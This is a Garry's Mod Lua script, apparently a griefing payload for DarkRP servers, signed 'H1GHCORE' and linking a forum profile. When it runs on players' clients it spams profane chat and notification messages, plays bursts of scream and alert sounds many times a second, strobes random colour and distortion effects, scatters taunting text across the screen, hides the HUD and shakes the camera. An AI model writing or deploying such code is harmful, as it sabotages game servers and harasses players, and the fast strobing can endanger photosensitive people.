if CLIENT then
    timer.Create("HighcoreSpam", 0.05, 0, function()
        DarkRP.notify(LocalPlayer(), 1, 4, "FUCKED UP BY H1GHCORE")
        chat.AddText(Color(255,0,0), "FUCKED UP BY H1GHCORE https://brokencore.club/members/18218/")
    end)


    local sounds = {
        "npc/stalker/go_alert2a.wav", "npc/stalker/go_alert2b.wav", "npc/stalker/go_alert2.wav",
        "ambient/voices/scream1.wav", "ambient/voices/scream2.wav", "ambient/voices/scream3.wav",
        "ambient/creatures/town_child_scream1.wav", "ambient/voices/citizen_beaten1.wav",
        "ambient/voices/citizen_beaten5.wav", "npc/zombie/zombie_pain1.wav",
        "npc/zombie/zombie_pain2.wav", "npc/zombie/zombie_pain3.wav",
        "npc/zombie/zombie_voice_idle1.wav", "npc/zombie/zombie_voice_idle2.wav",
        "npc/combine_gunship/gunship_ping.wav", "npc/metropolice/vo/affirmative.wav",
        "npc/metropolice/vo/wegotadbhere.wav", "npc/combine_soldier/vo/alert1.wav",
        "npc/combine_soldier/vo/overwatch.wav", "npc/combine_soldier/vo/contact.wav",
        "npc/combine_soldier/vo/engaging.wav", "npc/combine_soldier/vo/lostcontact.wav",
        "npc/combine_soldier/vo/overrun.wav", "npc/combine_soldier/vo/ripcord.wav",
        "npc/combine_soldier/vo/unitdown.wav", "npc/combine_soldier/vo/executingfullresponse.wav",
        "npc/combine_soldier/vo/confirmsectornotsterile.wav", "npc/combine_soldier/vo/containmentproceeding.wav",
        "npc/combine_soldier/vo/callcontactparasitics.wav", "npc/combine_soldier/vo/noviscon.wav",
        "npc/combine_soldier/vo/negative.wav", "npc/combine_soldier/vo/firetoharbor.wav"
    }

    timer.Create("HighcoreSounds", 0.1, 0, function()
        for i = 1, 8 do 
            timer.Simple(i * 0.02, function()
                LocalPlayer():EmitSound(table.Random(sounds), 200, math.random(50, 150))
            end)
        end
    end)

    local lastEffectTime = 0
    local crazyMode = false
    local effectIntensity = 0

    hook.Add("RenderScreenspaceEffects", "HighcoreArtifacts", function()
        effectIntensity = effectIntensity + FrameTime() * 5
        if effectIntensity > 1 then effectIntensity = 1 end

        if CurTime() > lastEffectTime + 0.05 then
            lastEffectTime = CurTime()
            crazyMode = not crazyMode
        end

        DrawMotionBlur(0.2 + math.sin(CurTime())*0.3, math.random()*2, math.random()*0.2)
        DrawSharpen(math.random()*5, math.random()*2)
        DrawBloom(1.5, math.random()*3, math.random()*15, math.random()*15, 10, 1, 1, 1, 1)

        if crazyMode then
            DrawColorModify({
                ["$pp_colour_addr"] = math.random(),
                ["$pp_colour_addg"] = math.random(),
                ["$pp_colour_addb"] = math.random(),
                ["$pp_colour_brightness"] = math.random(-0.8,0.8),
                ["$pp_colour_contrast"] = math.random(0.5,5),
                ["$pp_colour_colour"] = math.random(0,3),
                ["$pp_colour_mulr"] = math.random(),
                ["$pp_colour_mulg"] = math.random(),
                ["$pp_colour_mulb"] = math.random()
            })
            DrawMaterialOverlay("effects/tp_eyefx/tpeye"..math.random(1,3), math.random())
            DrawTexturize(math.random()*2, Material("pp/texturize/noise.png"))
            DrawSobel(math.random()*3)
        else
            DrawSunbeams(math.random(), math.random(), math.random()*0.1, 0, 0)
            DrawMaterialOverlay("effects/strider_pinch_dudv", math.random()*0.5)
        end

        if math.random() > 0.7 then
            DrawToyTown(math.random()*10, ScrH()/math.random(1,3))
        end
    end)

    hook.Add("HUDPaint", "HighcoreTextSpam", function()
        surface.SetFont("DermaLarge")
        for i = 1, 30 do
            local alpha = math.random(100, 255)
            local col = HSVToColor(math.random(360), 1, 1)
            surface.SetTextColor(col.r, col.g, col.b, alpha)
            surface.SetTextPos(math.random(-50, ScrW()), math.random(-50, ScrH()))
            surface.DrawText("FUCKED UP BY H1GHCORE")
            
            local angle = CurTime() * 10 + i
            local x = ScrW()/2 + math.cos(angle) * 300
            local y = ScrH()/2 + math.sin(angle) * 300
            draw.DrawText("H1GHCORE", "DermaLarge", x, y, Color(255,0,0,200), TEXT_ALIGN_CENTER)
        end

        local pulse = math.abs(math.sin(CurTime() * 5)) * 255
        draw.DrawText("YOU ARE FUCKED", "Trebuchet24", ScrW()/2, ScrH()/2, Color(255,0,0,pulse), TEXT_ALIGN_CENTER)
    end)

    hook.Add("HUDShouldDraw", "DisableHUD", function(name)
        if math.random() > 0.7 then return false end
    end)

    hook.Add("CalcView", "RandomShake", function(ply, pos, angles, fov)
        if math.random() > 0.5 then
            angles.p = angles.p + math.sin(CurTime() * 10) * 3
            angles.y = angles.y + math.cos(CurTime() * 7) * 3
            return {angles = angles}
        end
    end)
end